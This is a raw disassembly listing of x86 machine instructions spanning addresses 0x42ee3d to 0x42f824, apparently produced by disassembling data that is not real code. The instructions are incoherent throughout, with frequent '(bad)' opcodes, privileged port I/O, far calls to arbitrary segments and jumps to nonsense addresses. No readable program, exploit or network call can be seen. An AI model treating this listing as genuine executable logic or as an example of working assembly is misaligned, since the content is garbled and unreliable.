  42ee3d:	mov    eax,0x53a5c8e
  42ee42:	pop    ss
  42ee43:	xor    BYTE PTR [esi+0x5d],dh
  42ee46:	js     0x42eea9
  42ee48:	or     DWORD PTR [edx-0x56],ecx
  42ee4b:	retf   0x6f99
  42ee4e:	out    dx,eax
  42ee4f:	data16 jg 0x42eebd
  42ee52:	cmova  ebp,DWORD PTR [eax]
  42ee55:	sbb    esi,DWORD PTR [edi-0x67947067]
  42ee5b:	lock int3 
  42ee5d:	dec    ebp
  42ee5e:	dec    ebx
  42ee5f:	call   0xf504386
  42ee64:	inc    edi
  42ee65:	(bad)  
  42ee66:	outs   dx,DWORD PTR ds:[esi]
  42ee67:	add    al,0xaf
  42ee69:	iret   
  42ee6a:	das    
  42ee6b:	pop    ecx
  42ee6c:	xchg   esp,eax
  42ee6d:	xlat   BYTE PTR ds:[ebx]
  42ee6e:	mov    al,ds:0x20b94424
  42ee73:	xchg   DWORD PTR [edx],ebx
  42ee75:	addr16 stc 
  42ee77:	idiv   cl
  42ee79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee7a:	dec    esp
  42ee7b:	scas   al,BYTE PTR es:[edi]
  42ee7c:	mov    ah,0x11
  42ee7e:	fisubr DWORD PTR [edx+0x27a2f66c]
  42ee84:	sub    esi,DWORD PTR [edi-0x50]
  42ee87:	shl    ch,1
  42ee89:	cmp    BYTE PTR [eax],0x93
  42ee8c:	pop    ds
  42ee8d:	fs loope 0x42ef01
	...
  42eef4:	ret    
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	jno    0x42eea2
  42ef02:	mov    bh,0x14
  42ef04:	pop    esp
  42ef05:	test   BYTE PTR [ecx],0x0
  42ef08:	add    al,0x1
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	out    dx,al
  42ef0d:	into   
  42ef0e:	cwde   
  42ef0f:	xchg   ebx,eax
  42ef10:	das    
  42ef11:	mov    eax,0x92ff4b1d
  42ef16:	pop    DWORD PTR [ebp-0x4b]
  42ef19:	mov    dl,0xfd
  42ef1b:	push   edx
  42ef1c:	inc    ebx
  42ef1d:	sti    
  42ef1e:	push   ds
  42ef1f:	cs mov ch,0x4a
  42ef22:	and    esp,DWORD PTR [ecx+0x6a6ad913]
  42ef28:	xor    ch,BYTE PTR [esi+0x6d]
  42ef2b:	dec    eax
  42ef2c:	dec    esi
  42ef2d:	sbb    DWORD PTR [ecx+0x1ae41b19],eax
  42ef33:	inc    edi
  42ef34:	xor    BYTE PTR [ecx+edi*4],ah
  42ef37:	ret    0xdd05
  42ef3a:	test   DWORD PTR [ebx],0xcb9a3b0d
  42ef40:	aam    0x4
  42ef42:	loopne 0x42ef67
  42ef44:	(bad)  
  42ef45:	jae    0x42efb2
  42ef47:	and    DWORD PTR [ebx],ecx
  42ef49:	(bad)  [esi]
  42ef4b:	and    DWORD PTR [edi+eax*4+0x63],esp
  42ef4f:	sahf   
  42ef50:	dec    ebp
  42ef51:	imul   eax,DWORD PTR [edi],0xffffff9c
  42ef54:	out    0x5a,eax
  42ef56:	adc    al,0x31
  42ef58:	ret    0xcce8
  42ef5b:	jmp    edi
  42ef5d:	in     eax,dx
  42ef5e:	iret   
  42ef5f:	push   0xffffffb9
  42ef61:	cmp    dh,BYTE PTR [edi+0x4b656de8]
  42ef67:	jmp    0x42efca
  42ef69:	mov    al,0x4a
  42ef6b:	mov    al,0x41
  42ef6d:	stos   DWORD PTR es:[edi],eax
  42ef6e:	inc    eax
  42ef6f:	push   ds
  42ef70:	imul   esp,DWORD PTR [edi+esi*8],0x3b
  42ef74:	fisttp WORD PTR [ebx+0x21]
  42ef77:	sub    eax,0xe19d3bb2
  42ef7c:	lods   eax,DWORD PTR ds:[esi]
  42ef7d:	daa    
  42ef7e:	nop
  42ef7f:	arpl   WORD PTR [edx-0x55],si
  42ef82:	mov    eax,ds:0x3e987298
  42ef87:	inc    ecx
  42ef88:	in     al,0x28
  42ef8a:	adc    DWORD PTR [ebx-0x80],0xa9e4924c
  42ef91:	aas    
  42ef92:	sub    edx,DWORD PTR [eax-0x45]
  42ef95:	sbb    BYTE PTR ds:0x5381002f,0xb6
  42ef9c:	push   ebx
  42ef9d:	out    dx,al
  42ef9e:	test   DWORD PTR [edx],ebp
  42efa0:	int3   
  42efa1:	inc    ebp
  42efa2:	ficom  DWORD PTR [edi-0x62]
  42efa5:	in     al,dx
  42efa6:	popf   
  42efa7:	pushf  
  42efa8:	mov    edx,ebp
  42efaa:	xchg   edi,eax
  42efab:	leave  
  42efac:	into   
  42efad:	inc    edx
  42efae:	xchg   ebx,eax
  42efaf:	call   0x4591:0xdb6fdeab
  42efb6:	or     eax,0x7ec17208
  42efbb:	or     al,al
  42efbd:	cwde   
  42efbe:	inc    ecx
  42efbf:	pop    esp
  42efc0:	xchg   edx,eax
  42efc1:	push   ebx
  42efc2:	pop    eax
  42efc3:	addr16 daa 
  42efc5:	adc    cl,ah
  42efc7:	dec    ebx
  42efc8:	dec    ebp
  42efc9:	xchg   esp,eax
  42efca:	pop    ds
  42efcb:	and    al,0x57
  42efcd:	cmp    ch,0x95
  42efd0:	(bad)  [edi-0x72]
  42efd3:	rol    DWORD PTR [eax-0x503d2bdc],cl
  42efd9:	pusha  
  42efda:	xchg   esp,eax
  42efdb:	cli    
  42efdc:	or     al,0xf2
  42efde:	jnp    0x42efa1
  42efe0:	push   0xffffffe3
  42efe2:	xchg   ebx,eax
  42efe3:	fwait
  42efe4:	adc    BYTE PTR [ecx],bh
  42efe6:	inc    ecx
  42efe7:	fwait
  42efe8:	sub    DWORD PTR [ebp-0x8e26d0c],eax
  42efee:	sub    DWORD PTR [esi-0x4d],ebx
  42eff1:	in     eax,dx
  42eff2:	retf   
  42eff3:	mov    ds:0x229772ed,al
  42eff8:	adc    al,0xbb
  42effa:	out    dx,al
  42effb:	shl    DWORD PTR [esi],0xd2
  42effe:	cwde   
  42efff:	jb     0x42efaf
  42f001:	xchg   DWORD PTR ds:0x36261fac,esi
  42f007:	retf   0xc776
  42f00a:	cmp    dh,BYTE PTR [edx+0x3994a0d0]
	...
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	push   es
  42f081:	sub    cl,BYTE PTR [ecx]
  42f083:	xor    ah,BYTE PTR [eax-0x9]
  42f086:	add    DWORD PTR [eax],eax
  42f088:	add    al,0x1
  42f08a:	add    BYTE PTR [eax],al
  42f08c:	push   ds
  42f08d:	inc    ebp
  42f08e:	and    ah,ah
  42f090:	enter  0x4114,0x1f
  42f094:	push   eax
  42f095:	mov    ecx,0x2dd68ed
  42f09a:	and    ecx,DWORD PTR [eax-0x3d47706b]
  42f0a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0a1:	mov    esi,0xfbc41e62
  42f0a6:	push   edx
  42f0a7:	outs   dx,BYTE PTR ds:[esi]
  42f0a8:	outs   dx,DWORD PTR ds:[esi]
  42f0a9:	outs   dx,DWORD PTR ds:[esi]
  42f0aa:	sub    BYTE PTR [edi-0x1767efcc],al
  42f0b0:	or     DWORD PTR [edx+0x6d],ebx
  42f0b3:	add    BYTE PTR [ecx+eax*8+0x59],ch
  42f0b7:	aam    0xc7
  42f0b9:	loopne 0x42f104
  42f0bb:	sbb    dl,bh
  42f0bd:	repnz sub ah,BYTE PTR [edi-0x1a]
  42f0c1:	or     eax,0xe4ef9432
  42f0c6:	cmc    
  42f0c7:	ret    
  42f0c8:	mov    ch,0x97
  42f0ca:	fcom   QWORD PTR [edx]
  42f0cc:	lds    eax,FWORD PTR [eax]
  42f0ce:	or     dl,BYTE PTR [esi-0x2cfabbcc]
  42f0d4:	sub    dh,BYTE PTR [edx*4-0x13f5f01c]
  42f0db:	xor    edi,esp
  42f0dd:	sbb    eax,0xfc954196
  42f0e2:	lods   eax,DWORD PTR ds:[esi]
  42f0e3:	popf   
  42f0e4:	loope  0x42f0f2
  42f0e6:	call   0xa0746f9e
  42f0eb:	ss test al,0xe1
  42f0ee:	push   ecx
  42f0ef:	cmp    eax,0xed7d15c
  42f0f4:	and    al,0x55
  42f0f6:	out    dx,eax
  42f0f7:	jne    0x42f0a3
  42f0f9:	pop    edi
  42f0fa:	hlt    
  42f0fb:	stos   DWORD PTR es:[edi],eax
  42f0fc:	mov    cl,0xbc
  42f0fe:	push   edi
  42f0ff:	jnp    0x42f16b
  42f101:	xor    edx,DWORD PTR [edx]
  42f103:	xchg   edx,eax
  42f104:	aas    
  42f105:	push   edx
  42f106:	daa    
  42f107:	ja     0x42f171
  42f109:	and    BYTE PTR [esi],0x7c
  42f10c:	xchg   esp,eax
  42f10d:	jle    0x42f0a6
  42f10f:	retf   
  42f110:	les    esi,FWORD PTR [esi]
  42f112:	push   esi
  42f113:	xchg   edi,eax
  42f114:	inc    esi
  42f115:	test   al,0x8c
  42f117:	mov    esp,0x5796d3df
  42f11c:	stc    
  42f11d:	aad    0x55
  42f11f:	sub    eax,0x5f9a37f9
  42f124:	sub    BYTE PTR [edx-0x20],ah
  42f127:	mov    bh,bh
  42f129:	(bad)  
  42f12a:	std    
  42f12b:	fs cld 
  42f12d:	jns    0x42f0c0
  42f12f:	fmul   QWORD PTR [ecx]
  42f131:	adc    eax,0x1f16671a
  42f136:	mov    dh,0x4e
  42f138:	loope  0x42f105
  42f13a:	into   
  42f13b:	xor    ah,ch
  42f13d:	add    eax,0x83f4ad87
  42f142:	ret    0xd2e5
  42f145:	mov    edx,0xd93d1619
  42f14a:	add    BYTE PTR [ebp+0x4880a157],bl
  42f150:	retf   
  42f151:	xchg   edx,eax
  42f152:	cmp    eax,0x4404ebb9
  42f157:	lea    ebp,[esi]
  42f159:	jae    0x42f0dd
  42f15b:	cmp    eax,0x5679e28a
  42f160:	or     eax,0xfbddc36
  42f165:	ss nop
  42f167:	(bad)  
  42f168:	rcr    BYTE PTR [eax+0x24724347],1
  42f16e:	jg     0x42f1c4
  42f170:	test   al,0x21
  42f172:	stc    
  42f173:	std    
  42f174:	enter  0xd5e4,0x5e
  42f178:	out    dx,al
  42f179:	mov    ch,0x60
  42f17b:	dec    ecx
  42f17c:	icebp  
  42f17d:	gs addr16 aaa 
  42f180:	retf   0x5d20
  42f183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f184:	dec    DWORD PTR [esi-0x63]
  42f187:	es test al,0x46
  42f18a:	mul    BYTE PTR [eax+0xc]
  42f18d:	push   edx
  42f18e:	cld    
  42f18f:	loopne 0x42f191
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	loope  0x42f24f
  42f202:	and    ecx,DWORD PTR [eax+0x64]
  42f205:	clc    
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    al,0x1
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	cli    
  42f20d:	mov    ebx,0x8225e016
  42f212:	mov    dl,0xc8
  42f214:	(bad)
  42f217:	jns    0x42f1ed
  42f219:	xor    BYTE PTR [edx+ebx*4],cl
  42f21c:	xchg   DWORD PTR [edx],ebx
  42f21e:	ret    0xc35
  42f221:	sbb    dh,BYTE PTR [esi-0x294831c5]
  42f227:	ss sbb eax,0xd4380276
  42f22d:	bound  edi,QWORD PTR [esi-0x77fd9c2]
  42f233:	(bad)
  42f236:	call   0x4dbc:0xe65621ae
  42f23d:	inc    esp
  42f23f:	fidivr DWORD PTR [edi]
  42f241:	push   esi
  42f242:	push   ss
  42f243:	jmp    0xd7f6f3f8
  42f248:	out    0x8b,eax
  42f24a:	sahf   
  42f24b:	std    
  42f24c:	and    edi,ebp
  42f24e:	pop    ebp
  42f24f:	loopne 0x42f217
  42f251:	inc    esp
  42f252:	push   ss
  42f253:	stos   BYTE PTR es:[edi],al
  42f254:	fldcw  WORD PTR [edx]
  42f256:	outs   dx,BYTE PTR ds:[esi]
  42f257:	jns    0x42f284
  42f259:	jmp    0x42f2da
  42f25b:	in     al,dx
  42f25c:	mov    bh,dh
  42f25e:	fbstp  TBYTE PTR [eax]
  42f260:	jne    0x42f1e6
  42f262:	in     al,dx
  42f263:	fwait
  42f264:	pusha  
  42f265:	mov    dh,BYTE PTR [edx+0x584afa25]
  42f26b:	mov    eax,ds:0xec261e95
  42f270:	daa    
  42f271:	push   ss
  42f272:	mov    eax,0x87cd738c
  42f277:	mov    dl,BYTE PTR [ebx-0x35ab4b4a]
  42f27d:	scas   eax,DWORD PTR es:[edi]
  42f27e:	push   ecx
  42f27f:	mov    eax,ds:0xb926e9fb
  42f284:	outs   dx,DWORD PTR ds:[esi]
  42f285:	push   cs
  42f286:	cld    
  42f287:	mov    bh,0xbc
  42f289:	inc    edx
  42f28a:	scas   al,BYTE PTR es:[edi]
  42f28b:	scas   al,BYTE PTR es:[edi]
  42f28c:	add    dl,ch
  42f28e:	xchg   DWORD PTR gs:[esi],ebx
  42f291:	out    dx,al
  42f292:	inc    edx
  42f293:	ins    DWORD PTR es:[edi],dx
  42f294:	xchg   edi,eax
  42f295:	inc    ebx
  42f296:	or     bl,0x8d
  42f299:	dec    esi
  42f29a:	test   al,0x2e
  42f29c:	jnp    0x42f2cb
  42f29e:	pushf  
  42f29f:	mov    ah,0x67
  42f2a1:	arpl   WORD PTR [edx-0x3cb40c48],sp
  42f2a7:	neg    cl
  42f2a9:	inc    esp
  42f2aa:	in     al,0x47
  42f2ac:	loope  0x42f2bc
  42f2ae:	das    
  42f2af:	or     al,al
  42f2b1:	dec    ecx
  42f2b2:	call   DWORD PTR [eax]
  42f2b4:	ret    0x1426
  42f2b7:	cmp    ch,BYTE PTR [edx+0x76]
  42f2ba:	sbb    edx,DWORD PTR [esi]
  42f2bc:	fisttp DWORD PTR [eax]
  42f2be:	loopne 0x42f333
  42f2c0:	jmp    0x4d41:0x52c3b483
  42f2c7:	jb     0x42f2a5
  42f2c9:	dec    ebp
  42f2ca:	push   esi
  42f2cb:	neg    BYTE PTR [ebp+eiz*8+0x68]
  42f2cf:	sbb    BYTE PTR [edi-0x23a246e0],bl
  42f2d5:	fisttp WORD PTR [ebp+0x4a]
  42f2d8:	mov    edx,0xd9eef216
  42f2dd:	test   al,0x2a
  42f2df:	clc    
  42f2e0:	dec    eax
  42f2e1:	adc    dh,dl
  42f2e3:	lds    esi,FWORD PTR [eax-0x5b]
  42f2e6:	push   cs
  42f2e7:	dec    esi
  42f2e8:	sbb    eax,0xb57920a3
  42f2ed:	fmul   DWORD PTR [ebp+0x7399e42b]
  42f2f3:	mov    esi,0x22d1fd4
  42f2f8:	dec    esi
  42f2f9:	int3   
  42f2fa:	inc    ebx
  42f2fb:	mov    dl,0xe2
  42f2fd:	ret    
  42f2fe:	jno    0x42f326
  42f300:	inc    ebp
  42f301:	loop   0x42f358
  42f303:	dec    ebx
  42f304:	mov    ebx,0xf124a6eb
  42f309:	inc    eax
  42f30a:	mov    fs,WORD PTR [esi+0x14]
  42f30d:	loopne 0x42f2bb
  42f30f:	push   ebp
	...
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	or     al,0x5f
  42f382:	not    BYTE PTR ds:0x1f968
  42f388:	add    al,0x1
  42f38a:	add    BYTE PTR [eax],al
  42f38c:	xchg   esp,eax
  42f38d:	repz adc dl,dl
  42f390:	inc    ebp
  42f391:	fisttp DWORD PTR [edx]
  42f393:	frstor [edi]
  42f395:	icebp  
  42f396:	jbe    0x42f3f5
  42f398:	je     0x42f404
  42f39a:	mov    bl,0x5
  42f39c:	jle    0x42f3cc
  42f39e:	mov    dh,0x23
  42f3a0:	shl    DWORD PTR [eax+0x69],cl
  42f3a3:	add    ebx,DWORD PTR [ecx+0x9]
  42f3a6:	fcmovnbe st,st(7)
  42f3a8:	cs xchg esi,eax
  42f3aa:	push   ebp
  42f3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3ac:	lea    edi,[edx+0x28a193bb]
  42f3b2:	or     DWORD PTR [ecx],esp
  42f3b4:	push   ss
  42f3b5:	jmp    0x42f3ce
  42f3b7:	mov    eax,0x28fb6319
  42f3bc:	cmc    
  42f3bd:	call   0x99e0:0x2eeb364
  42f3c4:	jae    0x42f39e
  42f3c6:	xchg   ecx,eax
  42f3c7:	add    esp,DWORD PTR [edx+ebx*2]
  42f3ca:	aad    0x79
  42f3cc:	mov    esi,0x997f31de
  42f3d1:	sub    eax,0xcbb8650c
  42f3d6:	cdq    
  42f3d7:	fucomp st(1)
  42f3d9:	mov    ?,WORD PTR [ebx+eiz*4+0x7]
  42f3dd:	fcmovnbe st,st(0)
  42f3df:	xchg   ebp,eax
  42f3e0:	push   esp
  42f3e1:	fstp   DWORD PTR [eax-0x52b94cbd]
  42f3e7:	pushf  
  42f3e8:	fidivr WORD PTR [esi-0x7]
  42f3eb:	or     DWORD PTR [ebp-0x726d20ca],edi
  42f3f1:	leave  
  42f3f2:	pop    ecx
  42f3f3:	fnstsw WORD PTR [ebp+0x21]
  42f3f6:	xchg   edi,eax
  42f3f7:	sub    BYTE PTR [ebp-0x33437448],ah
  42f3fd:	push   edi
  42f3fe:	xchg   esp,eax
  42f3ff:	cmc    
  42f400:	jg     0x42f3fb
  42f402:	enter  0x8111,0xc4
  42f406:	loope  0x42f403
  42f408:	add    BYTE PTR [ebx],ah
  42f40a:	into   
  42f40b:	cmc    
  42f40c:	test   DWORD PTR [edi],edi
  42f40e:	cmp    al,0xcc
  42f410:	ins    DWORD PTR es:[edi],dx
  42f411:	or     cl,BYTE PTR [eax-0x42a07b1f]
  42f417:	and    esi,DWORD PTR [ecx]
  42f419:	mov    ah,BYTE PTR [esi+0x2323a2aa]
  42f41f:	adc    edx,DWORD PTR [ebp+0x20]
  42f422:	repz gs sahf 
  42f425:	add    al,0x15
  42f427:	neg    DWORD PTR ds:[eax]
  42f42a:	or     esi,esp
  42f42c:	jmp    0xf326:0x936d80e4
  42f433:	rcl    ecx,cl
  42f435:	mov    ecx,0xa2aa50e5
  42f43a:	dec    esi
  42f43b:	inc    ecx
  42f43c:	jb     0x42f435
  42f43e:	mov    esi,0x36e2e463
  42f443:	jmp    0x90ba54aa
  42f448:	in     eax,dx
  42f449:	enter  0xef21,0xda
  42f44d:	popa   
  42f44e:	adc    BYTE PTR [edx-0x5e],dh
  42f451:	inc    esp
  42f452:	sbb    eax,0xe72bcf83
  42f457:	dec    DWORD PTR [ecx+0x167986c7]
  42f45d:	pop    ebx
  42f45e:	ror    BYTE PTR [esp+eiz*4],1
  42f461:	loop   0x42f441
  42f463:	call   0xd0f96d45
  42f468:	popa   
  42f469:	jmp    0x42f47a
  42f46b:	mov    eax,ds:0x94ae16f4
  42f470:	adc    DWORD PTR [ecx-0x3d400d34],eax
  42f476:	jo     0x42f4c6
  42f478:	mov    bl,0xbf
  42f47a:	out    dx,eax
  42f47b:	fcomp  QWORD PTR [edi]
  42f47d:	pusha  
  42f47e:	neg    BYTE PTR [eax-0x59]
  42f481:	sti    
  42f482:	sub    DWORD PTR [ebp+ebx*4+0x5],0x53
  42f487:	mov    bl,0xdf
  42f489:	neg    ch
  42f48b:	xchg   ecx,eax
  42f48c:	push   edi
  42f48d:	push   0xad7d
	...
  42f4f2:	add    BYTE PTR [eax],al
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	fs adc dl,bl
  42f503:	xor    ch,BYTE PTR [edx+edi*8+0x1]
  42f507:	add    BYTE PTR [ecx+eax*1],al
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	dec    edx
  42f50d:	pop    edi
  42f50e:	sbb    dh,cl
  42f510:	jne    0x42f501
  42f512:	or     cl,BYTE PTR [ecx-0x65]
  42f515:	paddsw mm2,QWORD PTR [edx+0x39]
  42f519:	inc    esp
  42f51a:	push   0x6af22ba6
  42f51f:	dec    eax
  42f520:	inc    eax
  42f521:	fcomp  DWORD PTR [ebx+0x3eb59e03]
  42f527:	mov    bl,0x92
  42f529:	fiadd  WORD PTR [eax-0x7b9b9f20]
  42f52f:	xchg   edx,eax
  42f530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f531:	sbb    eax,0x253f1a83
  42f536:	icebp  
  42f537:	retf   0x5a80
  42f53a:	push   esi
  42f53b:	enter  0x8c0a,0xd0
  42f53f:	sbb    ebx,ebx
  42f541:	ja     0x42f504
  42f543:	mov    ecx,0x46c4ab0f
  42f548:	retf   0xe359
  42f54b:	dec    edx
  42f54c:	cwde   
  42f54d:	add    BYTE PTR [ebp+ecx*8-0x58],0x9c
  42f552:	add    ch,BYTE PTR [edx]
  42f554:	inc    edx
  42f555:	jp     0x42f50b
  42f557:	mov    esi,0x3211bec0
  42f55c:	imul   ebx,DWORD PTR [edi+0xf],0xfffffff5
  42f560:	gs sbb eax,0x6264b8ba
  42f566:	out    0xa8,eax
  42f568:	jecxz  0x42f5b4
  42f56a:	mov    dh,0xaa
  42f56c:	jp     0x42f4f2
  42f56e:	adc    ebx,DWORD PTR [esi]
  42f570:	pop    es
  42f571:	repz push ss
  42f573:	jmp    0x3a9c86ca
  42f578:	xor    al,0x1b
  42f57a:	jo     0x42f516
  42f57c:	dec    edi
  42f57d:	sbb    eax,0xa2422b67
  42f582:	sub    esi,DWORD PTR [ecx]
  42f584:	lods   eax,DWORD PTR ds:[esi]
  42f585:	sbb    cl,ah
  42f587:	xchg   edx,eax
  42f588:	sbb    al,0x6c
  42f58a:	mov    dl,0xfd
  42f58c:	(bad)
  42f58f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f590:	lock aad 0xb3
  42f593:	add    al,0x80
  42f595:	dec    ebx
  42f596:	xchg   ecx,eax
  42f597:	(bad)  
  42f598:	mov    ecx,0x14e7dee
  42f59d:	mov    esi,0xbd747e8c
  42f5a2:	ret    0x3ae2
  42f5a5:	jl     0x42f59c
  42f5a7:	sbb    ebp,DWORD PTR [edx-0x9aa9646]
  42f5ad:	into   
  42f5ae:	dec    esp
  42f5af:	ret    0x211
  42f5b2:	mov    edx,0x8731824
  42f5b7:	(bad)  
  42f5b8:	data16 mov bl,BYTE PTR [edi]
  42f5bb:	xor    ch,BYTE PTR [eax+eax*1+0x51]
  42f5bf:	aam    0x20
  42f5c1:	punpcklbw mm0,DWORD PTR [eax+0x31bcd4ff]
  42f5c8:	push   esp
  42f5c9:	fstp   QWORD PTR [ecx+eiz*4]
  42f5cc:	mov    ds:0x82605968,al
  42f5d1:	pop    edx
  42f5d2:	jnp    0x42f64f
  42f5d4:	test   al,0xa4
  42f5d6:	dec    esi
  42f5d7:	(bad)  
  42f5d8:	cmc    
  42f5d9:	xlat   BYTE PTR ds:[ebx]
  42f5da:	fsubr  DWORD PTR [ebp+0x5a79b1ff]
  42f5e0:	mov    dh,0xca
  42f5e2:	and    BYTE PTR [esi],ch
  42f5e4:	arpl   bp,bp
  42f5e6:	ins    DWORD PTR es:[edi],dx
  42f5e7:	mov    cl,BYTE PTR [eax]
  42f5e9:	call   0xd1306baf
  42f5ee:	nop
  42f5ef:	fidivr WORD PTR [edx]
  42f5f1:	das    
  42f5f2:	and    eax,0x5db6df8b
  42f5f7:	dec    esp
  42f5f8:	(bad)  
  42f5f9:	jecxz  0x42f62d
  42f5fb:	mov    edx,0x5caf3a9b
  42f600:	or     al,0x8
  42f602:	not    DWORD PTR [edi]
  42f604:	stos   DWORD PTR es:[edi],eax
  42f605:	jb     0x42f662
  42f607:	mov    al,ds:0x3c43f2fa
  42f60c:	xchg   ebx,eax
  42f60d:	jo     0x42f616
  42f60f:	xchg   ebp,eax
	...
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	cli    
  42f681:	mov    dl,0xc5
  42f683:	in     al,dx
  42f684:	jo     0x42f681
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    al,0x1
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	call   0x184c5fb3
  42f691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f692:	xchg   DWORD PTR [esi-0x2a],ebx
  42f695:	sti    
  42f696:	test   eax,edi
  42f698:	xlat   BYTE PTR ds:[ebx]
  42f699:	popf   
  42f69a:	mov    BYTE PTR [esi-0x3ed85b3f],cl
  42f6a0:	mov    ebx,0x928846df
  42f6a5:	fiadd  DWORD PTR [ebp-0x5f]
  42f6a8:	add    eax,0xfc7500e9
  42f6ad:	lahf   
  42f6ae:	and    dh,al
  42f6b0:	ret    
  42f6b1:	mov    al,ds:0xbe32816
  42f6b6:	or     ecx,ebx
  42f6b8:	cli    
  42f6b9:	xchg   ebp,eax
  42f6ba:	nop
  42f6bb:	pop    edi
  42f6bc:	sbb    dh,dh
  42f6be:	scas   eax,DWORD PTR es:[edi]
  42f6bf:	sahf   
  42f6c0:	push   ebx
  42f6c1:	jp     0x42f6a1
  42f6c3:	stos   DWORD PTR es:[edi],eax
  42f6c4:	aas    
  42f6c5:	mov    ch,0x59
  42f6c7:	jmp    0x46dc:0xd8ef2462
  42f6ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f6cf:	cmp    ecx,DWORD PTR [ecx-0xd88c337]
  42f6d5:	push   edi
  42f6d6:	pop    DWORD PTR [edi]
  42f6d8:	pop    edx
  42f6d9:	or     eax,0x28f780cb
  42f6de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f6df:	leave  
  42f6e0:	xor    al,0xb6
  42f6e2:	clc    
  42f6e3:	adc    edx,ebp
  42f6e5:	push   esi
  42f6e6:	daa    
  42f6e7:	cmp    BYTE PTR [esi+eiz*8],dl
  42f6ea:	call   0x4b21:0xc4339e56
  42f6f1:	repz mov eax,ds:0x30e5999
  42f6f7:	retf   
  42f6f8:	dec    esi
  42f6f9:	jl     0x42f749
  42f6fb:	outs   dx,DWORD PTR ds:[esi]
  42f6fc:	or     eax,0x7f7f0572
  42f701:	jg     0x42f6b6
  42f703:	cmp    cl,BYTE PTR [edx+0x76]
  42f706:	out    dx,eax
  42f707:	mov    dl,0x6b
  42f709:	or     al,0x17
  42f70b:	or     al,0xd2
  42f70d:	xor    DWORD PTR [esi+0x79c32cd4],eax
  42f713:	mov    ss,WORD PTR [edi-0xa3c1854]
  42f719:	pop    esp
  42f71a:	pop    ebp
  42f71b:	mov    bh,0x40
  42f71d:	aaa    
  42f71e:	jmp    0x7f3e7683
  42f723:	xchg   ebx,eax
  42f724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f725:	xor    eax,0xbd8b11f0
  42f72a:	xor    BYTE PTR [ecx],bh
  42f72c:	dec    edx
  42f72d:	add    al,0x9c
  42f72f:	fs sbb al,0xb7
  42f732:	push   ds
  42f733:	fdivr  QWORD PTR [ecx]
  42f735:	mov    ah,0x21
  42f737:	dec    edx
  42f738:	cmp    ebx,0xffffffd9
  42f73b:	loope  0x42f6c2
  42f73d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f73e:	lahf   
  42f73f:	adc    DWORD PTR [edx+0x2727f880],ecx
  42f745:	xor    BYTE PTR [eax+0x3c],ah
  42f748:	inc    edi
  42f749:	mov    cl,0xdb
  42f74b:	(bad)  
  42f74c:	fst    DWORD PTR [edx+0x72282da5]
  42f752:	or     esi,DWORD PTR [edx+0xaf4b4b0]
  42f758:	call   0xea8d492e
  42f75d:	not    BYTE PTR [di-0x2b64]
  42f762:	push   0x9d73414a
  42f767:	pop    ss
  42f768:	(bad)  
  42f76b:	mov    eax,0xed23a7d4
  42f770:	push   ebp
  42f771:	(bad)  
  42f772:	adc    ecx,esp
  42f774:	in     al,0xd8
  42f776:	in     al,dx
  42f777:	je     0x42f76b
  42f779:	pop    esi
  42f77a:	push   ebp
  42f77b:	xchg   cx,ax
  42f77d:	push   0x32f0a3a8
  42f782:	add    DWORD PTR [edi+0x4c],edi
  42f785:	daa    
  42f786:	fisub  DWORD PTR [edi]
  42f788:	add    BYTE PTR [edx],dl
  42f78a:	ret    
  42f78b:	jo     0x42f7d2
  42f78d:	cmp    al,0xbb
  42f78f:	bound  eax,QWORD PTR [eax]
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x8c79f410
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	in     al,dx
  42f80d:	sbb    al,0xe0
  42f80f:	popf   
  42f810:	or     BYTE PTR [eax+0x63],cl
  42f813:	pusha  
  42f814:	xchg   ecx,eax
  42f815:	(bad)  
  42f816:	shr    BYTE PTR [edi],cl
  42f818:	shl    ebp,cl
  42f81a:	test   BYTE PTR [esi],0x94
  42f81d:	xor    eax,0x3297dfd6
  42f822:	jnp    0x42f84e
  42f824:	push   ds
